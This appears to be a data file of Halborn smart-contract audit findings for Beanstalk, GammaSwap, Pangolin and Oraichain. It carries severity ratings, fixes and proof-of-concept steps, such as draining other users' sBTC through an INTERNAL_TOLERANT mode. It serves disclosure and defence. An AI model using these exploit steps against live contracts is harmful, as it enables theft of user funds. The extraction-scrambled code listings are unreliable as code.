Listing 10 1 RewarderComplex . sol :4: pragma experimental ABIEncoderV2 ; 2 GovernorAlpha . sol :2: pragma experimental ABIEncoderV2 ; 3 PNG . sol :2: pragma experimental ABIEncoderV2 ; 4 MiniChefV2 . sol :4: pragma experimental ABIEncoderV2 ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: When possible, do not use experimental features in the final live deployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). 41 Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk. 42 3.10 (HAL-10) EXTERNAL CALLS WITHIN A LOOP - LOW ",
        "labels": [
            "Halborn",
            "Pangolin",
            "Severity: Informational"
        ]
    },
    {
        "title": "INTERNAL BALANCE TOKENS CAN BE DRAINED THROUGH THE CURVEFACET.EXCHANGEUNDERLYING FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the CurveFacet, the exchangeUnderlying() function is used to swap underlying assets from different Curve stable pools: Listing 1: CurveFacet.sol (Lines 70,72,76,77) ( int128 i , int128 j ) = getUnderlyingIandJ ( fromToken , toToken , IERC20 ( fromToken ). receiveToken ( amountIn , msg . sender , fromMode ) IERC20 ( fromToken ). approveToken ( pool , amountIn ); if ( toMode == LibTransfer . To . EXTERNAL ) { ICurvePoolR ( pool ). exchange_underlying ( 66 function exchangeUnderlying ( address pool , 67 address fromToken , 68 address toToken , 69 uint256 amountIn , 70 uint256 minAmountOut , 71 LibTransfer . From fromMode , 72 73 LibTransfer . To toMode 74 ) external payable nonReentrant { 75  pool ); 76  ; 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 i , j , amountIn , minAmountOut , msg . sender i , j , amountIn , } else { ); uint256 amountOut = ICurvePool ( pool ). exchange_underlying ( 18 minAmountOut ); msg . sender . increaseInternalBalance ( IERC20 ( toToken ) , 92 93 94  amountOut ); } 95 96 } The LibTransfer.From fromMode has 4 different modes:  EXTERNAL  INTERNAL  EXTERNAL_INTERNAL  INTERNAL_TOLERANT With the INTERNAL_TOLERANT fromMode tokens will be collected from the users Internal Balance and the transaction will not fail if there is not enough tokens there. As in the receiveToken() call, users can use the INTERNAL_TOLERANT fromMode and the value returned by receiveToken() is not checked users can abuse this and swap tokens that belong to other users (tokens that are part of other users internal balance). Proof of Concept: Pool: 0x99AE07e7Ab61DCCE4383A86d14F61C68CdCCbf27 Underlying WBTC: 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599 Underlying sBTC: 0xfE18be6b3Bd88A2D2A7f928d00292E7a9963CfC6 1. User8 transfers 10_000000000000000000 sBTC tokens to his internal balance. 2. User2 calls exchangeUnderlying() with an INTERNAL_TOLERANT fromMode, setting as the amountIn 10_000000000000000000 and as fromToken the sBTC token address. These sBTC tokens do belong to user8. 3. User2 successfully swaps for free the sBTC for the WBTC tokens, getting 10_00184757 WBTC in his external balance. 19 4. Now to tries User8 withdraw the 10_000000000000000000 sBTC tokens he had deposited previously, but the transactions fails as the contract does not have those tokens anymore. They were swapped and stolen by user2. internal balance from his Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to save the return value of the receiveToken() call and overwrite the amountIn variable with that return as shown below: Listing 2: CurveFacet.sol (Line 76) 66 function exchangeUnderlying ( address pool , 67 address fromToken , 68 address toToken , 69 uint256 amountIn , 70 uint256 minAmountOut , 71 LibTransfer . From fromMode , 72 73 LibTransfer . To toMode 74 ) external payable nonReentrant { 75  pool ); ( int128 i , int128 j ) = getUnderlyingIandJ ( fromToken , toToken , 20 amountIn = IERC20 ( fromToken ). receiveToken ( amountIn , msg . sender IERC20 ( fromToken ). approveToken ( pool , amountIn ); if ( toMode == LibTransfer . To . EXTERNAL ) { ICurvePoolR ( pool ). exchange_underlying ( uint256 amountOut = ICurvePool ( pool ). exchange_underlying ( ); msg . sender . increaseInternalBalance ( IERC20 ( toToken ) , 76  , fromMode ); 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94  amountOut ); } 95 96 } } else { ); i , j , amountIn , minAmountOut , msg . sender i , j , amountIn , minAmountOut Remediation Plan: SOLVED: The Beanstalk team corrected the issue by overwritting amountIn with the value returned from the receiveToken() call, as suggested. 21 ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Critical"
        ]
    },
    {
        "title": "USDC OF THE INTERNAL BALANCE CAN BE DRAINED BY ANY USER THROUGH THE FERTILIZERFACET.MINTFERTILIZER FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the FertilizerFacet, the mintFertilizer() function is used to buy Fertilizer in exchange for USDC: Listing 3: FertilizerFacet.sol (Lines 43-48) uint256 remaining = LibFertilizer . remainingRecapitalization () ; uint256 _amount = uint256 ( amount ); if ( _amount > remaining ) _amount = remaining ; LibTransfer . receiveToken ( 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 LibTransfer . From mode 38 39 ) external payable { 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  s . bpf ); 55 } C . usdc () , uint256 ( amount ). mul (1 e6 ) , msg . sender , mode ); uint128 id = LibFertilizer . addFertilizer ( uint128 (s . season . current ) , amount , minLP ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , This function has the same issue that was described in HAL01 - INTERNAL BALANCE TOKENS CAN BE DRAINED THROUGH THE CURVEFACET.EXCHANGEUNDERLYING 22 FUNCTION as the value returned by receiveToken() is not checked, users can abuse this and buy Fertilizer with the USDC of other users internal balance through the INTERNAL_TOLERANT fromMode. Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to save the return value of the receiveToken() call and overwrite the _amount variable with that return as shown below: Listing 4: FertilizerFacet.sol (Line 43) uint256 remaining = LibFertilizer . remainingRecapitalization () ; uint256 _amount = uint256 ( amount ); if ( _amount > remaining ) _amount = remaining ; _amount = LibTransfer . receiveToken ( 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 38 LibTransfer . From mode 39 ) external payable { 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  s . bpf ); 55 } C . usdc () , uint256 ( _amount ). mul (1 e6 ) , msg . sender , mode ); uint128 id = LibFertilizer . addFertilizer ( uint128 (s . season . current ) , uint128 ( _amount ) , minLP ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , 23 Remediation Plan: SOLVED: The Beanstalk team corrected the issue by considering the returned value of the receiveToken() call: Listing 5: FertilizerFacet.sol (Line 42) uint128 remaining = uint128 ( LibFertilizer . if ( amount > remaining ) amount = remaining ; amount = uint128 ( LibTransfer . receiveToken ( 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 38 LibTransfer . From mode 39 ) external payable { 40  remainingRecapitalization () ); // remaining <= 77 _000_000 so  downcasting is safe . 41 42 43 44 45 46 47  . 48 49 50 51 52 53  s . bpf ); 54 } C . usdc () , uint256 ( amount ). mul (1 e6 ) , msg . sender , mode uint128 (s . season . current ) , amount , minLP uint128 id = LibFertilizer . addFertilizer ( ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , ). div (1 e6 )); // return value <= amount , so downcasting is safe 24 ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Critical"
        ]
    },
    {
        "title": "INCONSISTENT INTERNAL BALANCES WHEN SUPPLYING TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the library LibTransfer, used by the TokenFacet contract, the transferToken() function assume that the amount of token is transferred to the smart contract after calling token.safeTransferFrom(sender, address(this), amount - receivedAmount); (and thus it updates the states variables accordingly). For example: Listing 6: LibTransfer.sol (Lines 37,38,74) if ( fromMode == From . EXTERNAL && toMode == To . EXTERNAL ) { token . transferFrom ( msg . sender , recipient , amount ); return amount ; } amount = receiveToken ( token , amount , msg . sender , fromMode ); sendToken ( token , amount , recipient , toMode ); return amount ; 29 function transferToken ( IERC20 token , 30 address recipient , 31 uint256 amount , 32 From fromMode , 33 34 To toMode 35 ) internal returns ( uint256 transferredAmount ) { 36 37 38 39 40 41 42 43 } 44 45 function receiveToken ( IERC20 token , 46 uint256 amount , 47 address sender , 48 49 From mode 50 ) internal returns ( uint256 receivedAmount ) { 51 52 if ( amount == 0) return 0; if ( mode != From . EXTERNAL ) { 25 receivedAmount = LibBalance . decreaseInternalBalance ( sender , token , amount , mode != From . INTERNAL ); if ( amount == receivedAmount || mode == From . return receivedAmount ; } token . safeTransferFrom ( sender , address ( this ) , amount - return amount ; 53 54 55 56 57 58 59  INTERNAL_TOLERANT ) 60 61 62  receivedAmount ); 63 64 } 65 66 function sendToken ( 67 68 69 70 71 ) internal { 72 73 74  amount ); 75 76 } IERC20 token , uint256 amount , address recipient , To mode if ( amount == 0) return ; if ( mode == To . INTERNAL ) LibBalance . increaseInternalBalance ( recipient , token , else token . safeTransfer ( recipient , amount ); However, this may not be true if the token is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount in the different state variables. 26 Proof of Concept: Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to get the actual received token amount by calculating the difference of token balance before and after the transfer. Remediation Plan: SOLVED: The transfer-on-fee tokens: Beanstalk team addressed the issue and now supports Listing 7: LibTransfer.sol (Lines 38,39,40,64,65,66,) 30 function transferToken ( IERC20 token , 31 address recipient , 32 uint256 amount , 33 From fromMode , 34 To toMode 35 36 ) internal returns ( uint256 transferredAmount ) { 37 38 39 40 uint256 beforeBalance = token . balanceOf ( recipient ); token . safeTransferFrom ( msg . sender , recipient , amount ); return token . balanceOf ( recipient ). sub ( beforeBalance ); if ( fromMode == From . EXTERNAL && toMode == To . EXTERNAL ) { 27 } amount = receiveToken ( token , amount , msg . sender , fromMode ); sendToken ( token , amount , recipient , toMode ); return amount ; if ( amount == 0) return 0; if ( mode != From . EXTERNAL ) { 41 42 43 44 45 } 46 47 function receiveToken ( IERC20 token , 48 uint256 amount , 49 address sender , 50 51 From mode 52 ) internal returns ( uint256 receivedAmount ) { 53 54 55 56 57 58 59 60 61  INTERNAL_TOLERANT ) 62 63 64 65  receivedAmount ); 66  beforeBalance )); 67 } sender , token , amount , mode != From . INTERNAL return receivedAmount ; ); if ( amount == receivedAmount || mode == From . } uint256 beforeBalance = token . balanceOf ( address ( this )) ; token . safeTransferFrom ( sender , address ( this ) , amount - return receivedAmount . add ( token . balanceOf ( address ( this )) . sub ( receivedAmount = LibBalance . decreaseInternalBalance ( 28 ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNLIMITED FERTILIZER CAN BE BOUGHT THROUGH THE FERTILIZERFACET.MINTFERTILIZER FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the FertilizerFacet contract, the mintFertilizer() function checks if the amount provided by the user is higher than the remaining amount of Fertilizer and if that is the case, _amount is overwritten with the remaining Fertilizer preventing users to buy more Fertilizer than what is remaining: Listing 8: FertilizerFacet.sol (Lines 42,45,51) uint256 remaining = LibFertilizer . remainingRecapitalization () ; uint256 _amount = uint256 ( amount ); if ( _amount > remaining ) _amount = remaining ; LibTransfer . receiveToken ( 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 38 LibTransfer . From mode 39 ) external payable { 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  s . bpf ); 55 } C . usdc () , uint256 ( amount ). mul (1 e6 ) , msg . sender , mode ); uint128 id = LibFertilizer . addFertilizer ( uint128 (s . season . current ) , amount , minLP ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , 29 Although, the contract wrongly uses the amount variable instead of _amount allowing users to mint more Fertilizer than what is remaining: Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use the _amount variable instead of amount for the receiveToken(), the and FertilizerFacet.mintFertilizer() function. beanstalkMint() addFertilizer() calls in Remediation Plan: SOLVED: The Beanstalk team corrected the issue: Listing 9: FertilizerFacet.sol (Line 41) 35 function mintFertilizer ( uint128 amount , 36 uint256 minLP , 37 LibTransfer . From mode 38 39 ) external payable { 40  remainingRecapitalization () ); // remaining <= 77 _000_000 so  downcasting is safe . 41 if ( amount > remaining ) amount = remaining ; uint128 remaining = uint128 ( LibFertilizer . 30 amount = uint128 ( LibTransfer . receiveToken ( C . usdc () , uint256 ( amount ). mul (1 e6 ) , msg . sender , mode ). div (1 e6 )); // return value <= amount , so downcasting is safe uint128 id = LibFertilizer . addFertilizer ( uint128 (s . season . current ) , amount , minLP ); C. fertilizer () . beanstalkMint ( msg . sender , uint256 ( id ) , amount , 42 43 44 45 46 47  . 48 49 50 51 52 53  s . bpf ); 54 } 31 ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Medium"
        ]
    },
    {
        "title": "ACTIVE FERTILIZER WILL BE CLAIMED AUTOMATICALLY BY THE SENDER DURING A SAFETRANSFERFROM CALL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Fertilizer contract contains the following _beforeTokenTransfer() hook: Listing 10: Fertilizer.sol (Lines 59,60) 50 function _beforeTokenTransfer ( address , // operator , 51 address from , 52 address to , 53 uint256 [] memory ids , 54 uint256 [] memory , // amounts 55 56 bytes memory // data 57 ) internal virtual override { 58 59 60 61 } uint256 bpf = uint256 ( IBS ( owner () ). beansPerFertilizer () ); if ( from != address (0) ) _update ( from , ids , bpf ); _update ( to , ids , bpf ); will hook or with This safeBatchTransferFrom() call and will claim the fertilizer claimable amount automatically on behalf of the sender: safeTransferFrom() called every be 32 If the amount of claimable fertilizer is zero, the receiver will get the full unfertilized amount as expected: This could allow the following scenario: 1. By making use of a third-party marketplace, user1 puts for sale his Fertilizer at a low price. That fertilizer id can be fully claimed at that time. 2. User2 buys the fertilizer planning to claim it afterwards and make some profit, but the fertilizer is claimed automatically on behalf of user1 during the safeTransferFrom() call and the user2 just receives an already claimed fertilizer. Risk Level: Likelihood - 3 Impact - 2 33 Recommendation: It is recommended to consider removing the _beforeTokenTransfer() hook so these claims are not done automatically, preventing the scenario mentioned. Remediation Plan: RISK ACCEPTED: The Beanstalk team accepts this risk. 34 ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Low"
        ]
    },
    {
        "title": "SEASONFACET.INCENTIVIZE EXPONENTIAL INCENTIVE LOGIC IS NOT WORKING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the SeasonFacet contract, the incentivize() function is used to send some Beans to the user that successfully called sunrise() to start a new season: Listing 11: SeasonFacet.sol (Lines 75,76) uint256 timestamp = block . timestamp . sub ( s . season . start . add (s . season . period . mul ( season () )) ); if ( timestamp > 300) timestamp = 300; uint256 incentive = LibIncentive . fracExp ( amount , 100 , 70 function incentivize ( address account , uint256 amount ) private { 71 72 73 74 75  timestamp , 1) ; 76 77 78 } C. bean () . mint ( account , amount ); emit Incentivization ( account , incentive ); As we can see, the rewards/timestamp is capped at a maximum of 300 seconds and makes use of exponential rewards. But then, in the mint call, the amount parameter is incorrectly used instead of incentive, which means that the caller will always receive a fixed amount of beans (100): 35 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to update the incentivize() function as shown below so the exponential rewards implementation is used: Listing 12: SeasonFacet.sol (Line 76) uint256 timestamp = block . timestamp . sub ( s . season . start . add (s . season . period . mul ( season () )) ); if ( timestamp > 300) timestamp = 300; uint256 incentive = LibIncentive . fracExp ( amount , 100 , 70 function incentivize ( address account , uint256 amount ) private { 71 72 73 74 75  timestamp , 1) ; 76 77 78 } C. bean () . mint ( account , incentive ); emit Incentivization ( account , incentive ); would This be implementation: the rewarded beans with the suggested/corrected Remediation Plan: SOLVED: The Beanstalk team corrected the issue and updated the code as suggested. 36 ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING REQUIRE CHECK IN TOKENFACET.WRAPETH FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the TokenFacet contract, the wrapEth(uint256 amount, LibTransfer.To mode) function wraps the amountof Ether into WETH and sends it to the user internal/external balance: Listing 13: TokenFacet.sol 52 function wrapEth ( uint256 amount , LibTransfer . To mode ) external  payable { 53 54 } LibWeth . wrap ( amount , mode ); Listing 14: LibWeth.sol (Lines 20,21) 19 function wrap ( uint256 amount , LibTransfer . To mode ) internal { 20 21 22 } deposit ( amount ); LibTransfer . sendToken ( IERC20 ( WETH ) , amount , msg . sender , mode ); As the msg.value is never compared to the amount parameter, if the msg. value sent by the user was higher than the amount the difference would be taken by the contract and any other user would be able to steal it. 37 Proof of Concept: Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to add a require statement that checks that msg.value is equal to the amount parameter set in the wrapEth() call. Remediation Plan: SOLVED: The Beanstalk team corrected the issue. Ether refunds were added instead of a require check. If there is leftover Ether in the contract, then it will be refunded. 38 ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Low"
        ]
    },
    {
        "title": "MULTIPLE OVERFLOWS IN MARKETPLACEFACET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the MarketplaceFacet there are multiple overflows that can cause some inconsistencies. One of them is located in the _createPodListing() function: Listing 15: Listing.sol (Line 60) uint256 plotSize = s. a [ msg . sender ]. field . plots [ index ]; require ( plotSize >= ( start + amount ) && amount > 0, \" Marketplace : Invalid Plot / Amount . \" 0 < pricePerPod , \" Marketplace : Pod price must be greater than 0. \" s .f . harvestable <= maxHarvestableIndex , \" Marketplace : Expired .\" ); require ( uint256 index , uint256 start , uint256 amount , uint24 pricePerPod , uint256 maxHarvestableIndex , LibTransfer . To mode 50 function _createPodListing ( 51 52 53 54 55 56 57 ) internal { 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  index ); 73 74 75 76 77 78 start , amount , pricePerPod , maxHarvestableIndex , ); require ( ); if ( s . podListings [ index ] != bytes32 (0) ) _cancelPodListing ( s. podListings [ index ] = hashListing ( 39 mode ); emit PodListingCreated ( msg . sender , index , start , amount , pricePerPod , maxHarvestableIndex , mode ); 79 80 81 82 83 84 85 86 87 88 89 90 91 } The require(plotSize >= (start + amount)&& amount > 0, \"Marketplace: Invalid Plot/Amount.\"); overflow allows users to create PodListings of very high amounts, although this can not be exploited since when removing the Plots from the seller through the removePlot() function SafeMath is used and the transaction reverts: Listing 16: PodTransfer.sol (Line 82) 72 function removePlot ( address account , 73 uint256 id , 74 uint256 start , 75 uint256 end 76 77 ) internal { 78 79 80 81 82 83 } uint256 amount = s . a[ account ]. field . plots [ id ]; if ( start == 0) delete s . a[ account ]. field . plots [ id ]; else s. a [ account ]. field . plots [ id ] = start ; if ( end != amount ) s .a [ account ]. field . plots [ id . add ( end )] = amount . sub ( end ); 40 On the other hand, a similar issue occurs in the roundAmount() function: Listing 17: Listing.sol (Line 169) 162 // If remainder left ( always <1 pod ) that would otherwise be  unpurchaseable 163 // due to rounding from calculating amount , give it to last buyer 164 function roundAmount ( PodListing calldata l , uint256 amount ) 165 166 167 168 { 169 private pure returns ( uint256 ) if (( l. amount - amount ) < (1000000 / l . pricePerPod )) amount =  l . amount ; 170 171 } return amount ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to make use of the SafeMath library in the functions described above. Remediation Plan: SOLVED: The Beanstalk team corrected the issue. All the overflows were addressed. 41 ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Low"
        ]
    },
    {
        "title": "FERTILIZERPREMINT.BUYANDMINT FUNCTION COULD BE SANDWICHED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Beanstalk_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the FertilizerPreMint, the function buy() is used to swap Ether into USDC through the UniswapV3 router: Listing 18: FertilizerPreMint.sol (Line 104) ISwapRouter . ExactInputSingleParams ({ IWETH ( WETH ). deposit { value : msg . value }() ; ISwapRouter . ExactInputSingleParams memory params = 94 function buy ( uint256 minAmountOut ) private returns ( uint256  amountOut ) { 95 96 97 98 99 100 101 102 103 104 105 106 107 108 } tokenIn : WETH , tokenOut : USDC , fee : POOL_FEE , recipient : CUSTODIAN , deadline : block . timestamp , amountIn : msg . value , amountOutMinimum : minAmountOut , sqrtPriceLimitX96 : 0 }) ; amountOut = ISwapRouter ( SWAP_ROUTER ). exactInputSingle ( params ); The amountOutMinimum is set with a user controlled parameter minAmountOut . If the Ether sent through msg.value is higher than the minAmountOut in USDC the transaction may get sandwiched causing the user to swap Ether for USDC at a higher cost, receiving less USDC for the same amount of Ether. The issue was flagged as informational, as there is a function in the FertilizerPreMint contract that allows to get the exact amount of USDC for a given amount of Ether after swap. We assume that this function is 42 used in the backend mitigating the issue. Only users interacting with the smart contract directly may have the problem described. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to inform the users, specially whales, that they should try to avoid interacting with the smart contract directly for this and that if they do, inform them on how they should determine the minAmountOut preventing them from getting sandwiched. Remediation Plan: SOLVED: The Beanstalk team documented their code mentioning that any slippage should be properly accounted by the users: Listing 19: FertilizerPreMint.sol (Line 49) 49 // Note : Slippage should be properly be accounted for in 50 // minBuyAmount when calling the buyAndMint function directly . 51 function buyAndMint ( uint256 minBuyAmount ) external payable  nonReentrant { 52 53  Not enough remaining \"); 54 55 } uint256 amount = buy ( minBuyAmount ); require ( IUSDC . balanceOf ( CUSTODIAN ) <= MAX_RAISE , \" Fertilizer : __mint ( amount ); 43 3.10 (HAL-10) POD PRICE IS LIMITED TO 16.7 BEANS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Beanstalk",
            "Severity: Informational"
        ]
    },
    {
        "title": "3.1 DOCUMENTATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Oraichain_CosmWasm_SmartContract_Halborn_Report_v1.pdf",
        "body": "The documentation to set up the environment and interact with it re- quires many libraries and packages not included there. Furthermore, for simulating the smart contracts interactions by cosmwasm-simulate tool, the documentation was provided by Oraichain team but not included in the repository. Recommendation: Consider updating the documentation. ",
        "labels": [
            "Halborn",
            "Oraichain_CosmWasm_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "3.2 VULNERABILITY SCANNING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Oraichain_CosmWasm_SmartContract_Halborn_Report_v1.pdf",
        "body": "Halborn used automated security scanners to assist with detection of well- known security issues and vulnerabilities. Among the tools used was cargo- audit, a security scanner for vulnerabilities reported to the RustSec Advisory Database. All vulnerabilities published in https://crates.io are stored in a repository named The RustSec Advisory Database. cargo- audit is a human-readable version of the advisory database which performs a scanning on Cargo.lock. Security Detections are only in scope. Reference: https://rustsec.org/advisories/ 8 Results: No vulnerabilities were founded. ",
        "labels": [
            "Halborn",
            "Oraichain_CosmWasm_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "] for initializing variables. 10 THANK YOU FOR CHOOSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Oraichain_CosmWasm_SmartContract_Halborn_Report_v1.pdf",
        "body": "Halborn used cargo-clippy code analysis tool to detect common mistakes and possible improvements in Rust code. More than 400 recommendations are stored in rust-lang. Reference: https://rust-lang.github.io/rust-clippy/master/index.html Results: 9 Recommendation: Its faster using a char than using a str for string methods that receive So, its better to use x a single-character str as an argument. instead of x because multi-byte unicode characters could be not cached. Otherwise, its widely accepted to use #[derive(Serialize, Deserialize, Clone, Debug, PartialEq, JsonSchema)] for initializing variables. 10 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Oraichain_CosmWasm_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "INITIAL LP DEPOSIT IS IMPOSSIBLE DUE TO MISCALCULATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The _depositNoPull() function in the BaseStrategy contract does not work properly. The first deposit is reverted with the ZeroAmount() error. In the _depositNoPull() function, the updateIndex() internal function is invoked with accFeeIndex, lastFeeIndex and lastCFMMFeeIndex call param- eters. If the value of the s.BORROWED_INVARIANT variable is positive, then some LP tokens are minted to developers, since the protocol charges It has been observed however that the contract also a handling fee. tries to mint LP tokens to developers even if the s.BORROWED_INVARIANT is zero. In this case, the devShares variable returns zero since there are no deposits in the contract and s.totalSupply is equal to zero, which prevents users from depositing funds in the contract. 18 Proof of Concept: Listing 1: First Deposit Fails - PoC uint256 loanId2 = positionManager . createLoan (1 , address ( uint256 loanId = positionManager . createLoan (1 , address ( vm . roll (16392000 + 1) ; // deployment block + 1 _addLiquidityWithUniRouter ( deployer , address ( usdt ) , vm . startPrank ( deployer ); usdt . transfer ( user1 , 5 * 1 e6 ); weth . transfer ( user1 , 2 * 1 e18 ); usdt . transfer ( user2 , 6 * 1 e6 ); weth . transfer ( user2 , 10 * 1 e18 ); 1 function test_depositNoPullPoC () public { 2 3  address ( weth ) , 50 * 1e6 , 10 * 1 e18 ); 4 5 6 7 8 9 10 11 12 13 14  cfmm_usdt_weth ) , deployer , type ( uint ). max ); 15  cfmm_usdt_weth ) , user2 , type ( uint ). max ); 16 17 18  = IPositionManager . DepositWithdrawParams ({ protocolId : 1, 19 cfmm : address ( cfmm_usdt_weth ) , 20 to : user1 , 21 lpTokens : cfmm_usdt_weth . balanceOf ( deployer ) , 22 23 deadline : 99999 24 25 26  cfmm_usdt_weth . balanceOf ( deployer )) ; 27 28 29 30 31 cfmm_usdt_weth . approve ( address ( positionManager ) , positionManager . depositNoPull ( depositData ); vm . stopPrank () ; }) ; } positionManager . transferFrom ( deployer , user1 , loanId ); IPositionManager . DepositWithdrawParams memory depositData 19 Screenshot: Code Location: BaseStrategy Listing 2: BaseStrategy (Lines 94,95) lastCFMMFeeIndex = updateCFMMIndex () ; lastFeeIndex = updateFeeIndex ( lastCFMMFeeIndex ); accFeeIndex = updateStore ( lastFeeIndex ); if (s . BORROWED_INVARIANT >= 0) { 90 function updateIndex () internal virtual returns ( uint256  accFeeIndex , uint256 lastFeeIndex , uint256 lastCFMMFeeIndex ) { 91 92 93 94 95 96 97 } mintToDevs ( lastFeeIndex , lastCFMMFeeIndex ); } BaseStrategy Listing 3: BaseStrategy (Line 126) if ( amount == 0) { revert ZeroAmount () ; 124 function _mint ( address account , uint256 amount ) internal virtual { 125 126 127 128 129 130 131 } } s. totalSupply += amount ; s. balanceOf [ account ] += amount ; emit Transfer ( address (0) , account , amount ); 20 Risk Level: Likelihood - 5 Impact - 3 Recommendation: Replace the greater than or equal to (>=) symbol with greater (>) to pre- vent calling the mintToDevs function for the first deposit. Remediation Plan: SOLVED: This finding was identified in a live code walkthrough jointly by the GammaSwap team and the Halborn team, and the existence of the finding was confirmed by the Halborn team. The greater than or equal to (>=) relation was replaced with greater than (>) relation. Commit ID: v1-strategies::6f6a7ba1f0fe8b9d7a7cb9b756ef5b3e6bfa55ab 21 ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: High"
        ]
    },
    {
        "title": "FIRST LIQUIDITY PROVIDER LOSES FUNDS DUE TO ROUNDING ISSUE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the initial asset deposit for ERC4626 Vaults, first liquidity provider can lose funds due to rounding issues. The risk above was already explained in EIP4626 standard: Finally, ERC-4626 Vault implementers should be aware of the need for specific, opposing rounding directions across the different mutable and view methods, as it is considered most secure to favor the Vault itself during calculations over its users: If (1) its calculating how many shares to issue to a user for a certain amount of the underlying tokens they provide or (2) its determining the amount of the underlying tokens to transfer to them for returning a certain amount of shares, it should round down. If (1) its calculating the amount of shares a user has to supply to receive a given amount of the underlying tokens or (2) its calculating the amount of underlying tokens a user has to provide to receive a certain amount of shares, it should round up. The current ShortStrategyERC4626 contract does not have any rounding validations for the security consideration above. Thus, the contract is vulnerable to the front-running attack. In this case, any attacker can front-run the first deposit operation to claim more assets during the _redeem call. 22 vm . roll (16392000 + 1) ; // deployment block + 1 _addLiquidityWithUniRouter ( deployer , address ( usdt ) , _addLiquidityWithUniRouter ( user1 , address ( usdt ) , address ( vm . startPrank ( user1 ); cfmm_usdt_weth . approve ( address ( univ2_usdt_weth_pool ) , 1) ; uint256 balance = cfmm_usdt_weth . balanceOf ( user1 ); cfmm_usdt_weth . transfer ( address ( univ2_usdt_weth_pool ) , Proof of Concept: Listing 4: PoC Code - ERC4626 Vulnerability vm . startPrank ( deployer ); weth . transfer ( user1 , 10 e18 ); usdt . transfer ( user1 , 10 e6 ); vm . stopPrank () ; 1 function 